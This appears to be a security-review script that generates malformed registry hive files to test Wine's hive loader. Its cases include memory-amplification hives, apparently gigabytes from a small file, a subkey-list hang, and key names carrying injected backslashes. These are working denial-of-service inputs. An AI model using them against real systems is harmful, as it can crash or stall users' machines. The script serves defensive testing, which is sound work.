#!/usr/bin/env python3
"""Craft malicious/edge-case regf hives for the wineserver hive loader (issue 010 review).
Usage: regf_craft.py OUTDIR  -> writes one .hiv per case (see CASES)."""
import os, struct, sys

class Hive:
    def __init__(self):
        self.bins = bytearray(b'hbin' + b'\0' * 28)
    def cell(self, payload, size=None):
        size = size or len(payload)
        size = (size + 4 + 7) & ~7
        off = len(self.bins) - 0  # offsets are relative to the first hbin
        self.bins += struct.pack('<i', -size) + payload.ljust(size - 4, b'\0')
        return off
    def nk(self, name, subkeys=None, values=None, nvalues=0, nsub=None):
        n = name.encode('latin-1')
        p = bytearray(76)
        p[0:2] = b'nk'
        struct.pack_into('<H', p, 2, 0x20)
        struct.pack_into('<I', p, 20, (nsub if nsub is not None else 1) if subkeys is not None else 0)
        struct.pack_into('<I', p, 28, subkeys if subkeys is not None else 0xffffffff)
        struct.pack_into('<I', p, 32, 0xffffffff)
        struct.pack_into('<I', p, 36, nvalues)
        struct.pack_into('<I', p, 40, values if values is not None else 0xffffffff)
        struct.pack_into('<I', p, 44, 0xffffffff)
        struct.pack_into('<I', p, 48, 0xffffffff)
        struct.pack_into('<H', p, 72, len(n))
        return self.cell(bytes(p) + n)
    def vk(self, name, typ, size, data):
        n = name.encode('latin-1')
        return self.cell(b'vk' + struct.pack('<HIIIHH', len(n), size, data, typ, 1, 0) + n)
    def li(self, offs, sig=b'li'):
        return self.cell(sig + struct.pack('<H', len(offs)) + b''.join(struct.pack('<I', o) for o in offs))
    def ulist(self, offs):
        return self.cell(b''.join(struct.pack('<I', o) for o in offs))
    def write(self, path, root):
        pad = (-len(self.bins)) % 4096
        if pad < 8: pad += 4096
        self.bins += struct.pack('<i', pad) + b'\0' * (pad - 4)
        struct.pack_into('<I', self.bins, 8, len(self.bins))
        base = bytearray(4096)
        base[0:4] = b'regf'
        struct.pack_into('<IIIIIIIII', base, 4, 1, 1, 0, 0, 1, 5, 0, 1, root)
        struct.pack_into('<I', base, 0x28, len(self.bins))
        struct.pack_into('<I', base, 0x2c, 1)
        s = 0
        for i in range(127): s ^= struct.unpack_from('<I', base, i * 4)[0]
        struct.pack_into('<I', base, 0x1fc, s)
        open(path, 'wb').write(bytes(base) + bytes(self.bins))

def placeholder_root(h):
    return h.nk('ROOT')  # patched later via patch_nk

def patch_nk(h, off, subkeys=None, nsub=1, values=None, nvalues=0):
    p = off + 4
    if subkeys is not None:
        struct.pack_into('<II', h.bins, p + 20, nsub, 0)
        struct.pack_into('<I', h.bins, p + 28, subkeys)
    if values is not None:
        struct.pack_into('<I', h.bins, p + 36, nvalues)
        struct.pack_into('<I', h.bins, p + 40, values)

def amp_vk(out, n=1024, datasize=1 << 20):
    """n distinct vk cells all pointing to one 1 MiB data cell: ~n MiB in wineserver from a ~1 MiB file."""
    h = Hive(); root = placeholder_root(h)
    data = h.cell(b'', datasize)
    vks = [h.vk('v%d' % i, 3, datasize, data) for i in range(n)]
    patch_nk(h, root, values=h.ulist(vks), nvalues=n)
    h.write(out, root)

def amp_db(out, n=16):
    """db big data whose 65535-entry segment list repeats one 16344-byte cell: ~1 GiB per value."""
    h = Hive(); root = placeholder_root(h)
    seg = h.cell(b'\xaa' * 16344)
    lst = h.ulist([seg] * 65535)
    db = h.cell(b'db' + struct.pack('<HI', 65535, lst))
    vks = [h.vk('b%d' % i, 3, 65535 * 16344, db) for i in range(n)]
    patch_nk(h, root, values=h.ulist(vks), nvalues=n)
    h.write(out, root)

def amp_list(out, keys=2000, n=2000):
    """keys subkeys sharing one value list of n vk cells: keys*n values from keys+n cells."""
    h = Hive(); root = placeholder_root(h)
    vks = [h.vk('v%d' % i, 4, 0x80000004, i) for i in range(n)]
    vl = h.ulist(vks)
    subs = [h.nk('k%d' % i, values=vl, nvalues=n) for i in range(keys)]
    patch_nk(h, root, subkeys=h.li(subs), nsub=keys)
    h.write(out, root)

def hang_ri(out, keys=50000):
    """keys subkeys sharing one ri list of 65535 entries, all pointing to one empty li: keys*65535 iterations."""
    h = Hive(); root = placeholder_root(h)
    li = h.li([])
    ri = h.li([li] * 65535, b'ri')
    subs = [h.nk('k%d' % i, subkeys=ri) for i in range(keys)]
    patch_nk(h, root, subkeys=h.li(subs[:65535]), nsub=keys)
    h.write(out, root)

def name_case(out, name):
    h = Hive(); root = placeholder_root(h)
    sub2 = h.nk('child')
    sub = h.nk(name, subkeys=h.li([sub2]))
    vl = h.ulist([h.vk('v', 4, 0x80000004, 1)])
    patch_nk(h, sub, values=vl, nvalues=1)
    patch_nk(h, root, subkeys=h.li([sub]))
    h.write(out, root)

def valid(out):
    h = Hive(); root = placeholder_root(h)
    sub = h.nk('Sub')
    patch_nk(h, sub, values=h.ulist([h.vk('v', 4, 0x80000004, 1)]), nvalues=1)
    patch_nk(h, root, subkeys=h.li([sub]))
    h.write(out, root)

CASES = {
    'valid': valid,
    'amp_vk': amp_vk,
    'amp_db': amp_db,
    'amp_list': amp_list,
    'hang_ri': hang_ri,
    'name_bs': lambda o: name_case(o, '\\'),
    'name_lead_bs': lambda o: name_case(o, '\\x'),
    'name_dbl_bs': lambda o: name_case(o, 'a\\\\b'),
    'name_path': lambda o: name_case(o, 'a\\b'),
    'name_empty': lambda o: name_case(o, ''),
}

if __name__ == '__main__':
    os.makedirs(sys.argv[1], exist_ok=True)
    for k, f in CASES.items(): f(os.path.join(sys.argv[1], k + '.hiv'))
